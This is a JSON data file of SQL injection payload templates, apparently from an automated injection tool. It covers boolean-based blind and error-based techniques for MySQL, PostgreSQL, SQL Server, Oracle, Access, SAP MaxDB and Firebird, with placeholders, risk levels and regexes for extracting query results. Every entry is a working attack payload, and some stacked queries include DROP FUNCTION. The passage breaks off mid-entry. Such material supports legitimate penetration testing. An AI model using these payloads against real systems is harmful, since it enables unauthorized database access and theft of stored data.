[{"where": [1], "vector": "AND [INFERENCE]", "risk": 1, "level": 1, "clause": [1], "title": "AND boolean-based blind - WHERE or HAVING clause", "request": {"payload": "AND [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}, "stype": 1}, {"where": [1], "vector": "AND [INFERENCE]", "risk": 1, "level": 4, "clause": [1], "title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)", "request": {"comment": "#", "payload": "AND [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": "AND [INFERENCE]", "risk": 1, "level": 4, "clause": [1], "title": "AND boolean-based blind - WHERE or HAVING clause (Generic comment)", "request": {"comment": "-- ", "payload": "AND [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}, "stype": 1}, {"where": [2], "vector": "OR ([INFERENCE])", "risk": 3, "level": 2, "clause": [1], "title": "OR boolean-based blind - WHERE or HAVING clause", "request": {"payload": "OR ([RANDNUM]=[RANDNUM])"}, "response": {"comparison": "OR ([RANDNUM]=[RANDNUM1])"}, "stype": 1}, {"where": [2], "vector": "OR ([INFERENCE])", "risk": 3, "level": 3, "clause": [1], "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)", "request": {"comment": "#", "payload": "OR ([RANDNUM]=[RANDNUM])"}, "response": {"comparison": "OR ([RANDNUM]=[RANDNUM1])"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [2], "vector": "OR ([INFERENCE])", "risk": 3, "level": 3, "clause": [1], "title": "OR boolean-based blind - WHERE or HAVING clause (Generic comment)", "request": {"comment": "-- ", "payload": "OR ([RANDNUM]=[RANDNUM])"}, "response": {"comparison": "OR ([RANDNUM]=[RANDNUM1])"}, "stype": 1}, {"where": [1], "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))", "risk": 1, "level": 3, "clause": [1, 2, 3], "title": "MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)", "request": {"payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))"}, "response": {"comparison": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", "risk": 1, "level": 2, "clause": [1, 2, 3], "title": "Generic boolean-based blind - Parameter replace (original value)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "stype": 1}, {"where": [3], "vector": "MAKE_SET([INFERENCE],[ORIGVALUE])", "risk": 1, "level": 3, "clause": [1, 2, 3], "title": "MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)", "request": {"payload": "MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])"}, "response": {"comparison": "MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "ELT([INFERENCE],[ORIGVALUE])", "risk": 1, "level": 4, "clause": [1, 2, 3], "title": "MySQL boolean-based blind - Parameter replace (ELT - original value)", "request": {"payload": "ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])"}, "response": {"comparison": "ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "([INFERENCE])*[ORIGVALUE]", "risk": 1, "level": 4, "clause": [1, 2, 3], "title": "MySQL boolean-based blind - Parameter replace (bool*int - original value)", "request": {"payload": "([RANDNUM]=[RANDNUM])*[ORIGVALUE]"}, "response": {"comparison": "([RANDNUM]=[RANDNUM1])*[ORIGVALUE]"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))", "risk": 1, "level": 3, "clause": [1, 2, 3], "title": "MySQL >= 5.0 boolean-based blind - Parameter replace (original value)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "stype": 1, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", "risk": 1, "level": 4, "clause": [1, 2, 3], "title": "MySQL < 5.0 boolean-based blind - Parameter replace (original value)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [3], "vector": "(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)", "risk": 2, "level": 3, "clause": [1, 2, 3], "title": "PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)", "request": {"payload": "(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)"}, "response": {"comparison": "(SELECT GENERATE_SERIES([ORIGVALUE],[ORIGVALUE],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)"}, "stype": 1, "details": {"dbms": "PostgreSQL"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", "risk": 1, "level": 3, "clause": [1, 3], "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "stype": 1, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "risk": 1, "level": 3, "clause": [1, 3], "title": "Oracle boolean-based blind - Parameter replace (original value)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "stype": 1, "details": {"dbms": "Oracle"}}, {"where": [3], "vector": "IIF([INFERENCE],[ORIGVALUE],1/0)", "risk": 1, "level": 3, "clause": [1, 3], "title": "Microsoft Access boolean-based blind - Parameter replace (original value)", "request": {"payload": "IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)"}, "response": {"comparison": "IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)"}, "stype": 1, "details": {"dbms": "Microsoft Access"}}, {"where": [3], "vector": "(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)", "risk": 1, "level": 3, "clause": [1, 3], "title": "SAP MaxDB boolean-based blind - Parameter replace (original value)", "request": {"payload": "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)"}, "response": {"comparison": "(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)"}, "stype": 1, "details": {"dbms": "SAP MaxDB"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))", "risk": 1, "level": 3, "clause": [2, 3], "title": "Generic boolean-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))"}, "stype": 1}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", "risk": 1, "level": 4, "clause": [2, 3], "title": "Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "stype": 1}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))", "risk": 1, "level": 3, "clause": [2, 3], "title": "MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))"}, "stype": 1, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", "risk": 1, "level": 4, "clause": [2, 3], "title": "MySQL < 5.0 boolean-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, "stype": 1, "details": {"dbms": "MySQL"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", "risk": 1, "level": 3, "clause": [3], "title": "Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, "stype": 1, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "risk": 1, "level": 3, "clause": [2, 3], "title": "Oracle boolean-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "stype": 1, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": ",IIF([INFERENCE],[ORIGVALUE],1/0)", "risk": 1, "level": 3, "clause": [2, 3], "title": "Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses", "request": {"payload": ",IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)"}, "response": {"comparison": ",IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)"}, "stype": 1, "details": {"dbms": "Microsoft Access"}}, {"where": [1], "vector": "; IF([INFERENCE]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]", "risk": 0, "level": 3, "clause": [0], "title": "Microsoft SQL Server/Sybase stacked conditional-error blind queries", "request": {"comment": "--", "payload": "; IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]"}, "response": {"comparison": "; IF([RANDNUM]=[RANDNUM1]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]"}, "stype": 1, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [2], "vector": "; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)", "risk": 0, "level": 3, "clause": [0], "title": "PostgreSQL stacked conditional-error blind queries", "request": {"comment": "--", "payload": "; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)"}, "response": {"comparison": "; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)"}, "stype": 1, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "risk": 0, "level": 1, "clause": [1], "title": "MySQL >= 5.0 AND error-based - WHERE or HAVING clause", "request": {"payload": "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [1], "vector": "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "risk": 0, "level": 2, "clause": [1], "title": "MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)", "request": {"payload": "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "risk": 0, "level": 3, "clause": [1], "title": "MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)", "request": {"payload": "AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "risk": 0, "level": 4, "clause": [1], "title": "MySQL >= 5.5 AND error-based - WHERE or HAVING clause (BIGINT UNSIGNED)", "request": {"payload": "AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}, {"where": [1], "vector": "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", "risk": 0, "level": 2, "clause": [1], "title": "MySQL >= 4.1 AND error-based - WHERE or HAVING clause", "request": {"payload": "AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 4.1"}}, {"where": [1], "vector": "AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", "risk": 0, "level": 1, "clause": [1], "title": "PostgreSQL AND error-based - WHERE or HAVING clause", "request": {"payload": "AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "PostgreSQL"}}, {"where": [1], "vector": "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "risk": 0, "level": 1, "clause": [1], "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause", "request": {"payload": "AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "AND [RANDNUM] IN (('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "risk": 0, "level": 2, "clause": [1], "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)", "request": {"payload": "AND [RANDNUM] IN (('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [1], "vector": "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)", "risk": 0, "level": 1, "clause": [1], "title": "Oracle AND error-based - WHERE or HAVING clause (XMLType)", "request": {"payload": "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 0, "level": 2, "clause": [1], "title": "Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)", "request": {"payload": "AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle", "dbms_version": ">= 8.1.6"}}, {"where": [1], "vector": "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],'[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 0, "level": 3, "clause": [1], "title": "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "request": {"payload": "AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Oracle"}}, {"where": [1], "vector": "AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')", "risk": 0, "level": 2, "clause": [1], "title": "Firebird AND error-based - WHERE or HAVING clause", "request": {"payload": "AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "Firebird"}}, {"where": [2], "vector": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)", "risk": 2, "level": 2, "clause": [1], "title": "MySQL >= 5.0 OR error-based - WHERE or HAVING clause", "request": {"payload": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}, {"where": [1], "vector": "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))", "risk": 2, "level": 3, "clause": [1], "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)", "request": {"payload": "OR EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])", "risk": 2, "level": 4, "clause": [1], "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)", "request": {"payload": "OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.1"}}, {"where": [1], "vector": "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))", "risk": 2, "level": 5, "clause": [1], "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)", "request": {"payload": "OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 5.5"}}, {"where": [2], "vector": "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)", "risk": 2, "level": 2, "clause": [1], "title": "MySQL >= 4.1 OR error-based - WHERE or HAVING clause", "request": {"payload": "OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL", "dbms_version": ">= 4.1"}}, {"where": [2], "vector": "OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)", "risk": 2, "level": 3, "clause": [1], "title": "MySQL OR error-based - WHERE or HAVING clause", "request": {"comment": "#", "payload": "OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "MySQL"}}, {"where": [2], "vector": "OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)", "risk": 2, "level": 2, "clause": [1], "title": "PostgreSQL OR error-based - WHERE or HAVING clause", "request": {"payload": "OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": "PostgreSQL"}}, {"where": [2], "vector": "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))", "risk": 2, "level": 2, "clause": [1], "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause", "request": {"payload": "OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))"}, "response": {"grep": "[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP]"}, "stype": 2, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}, {"where": [2], "vector": "OR [RANDNUM] IN 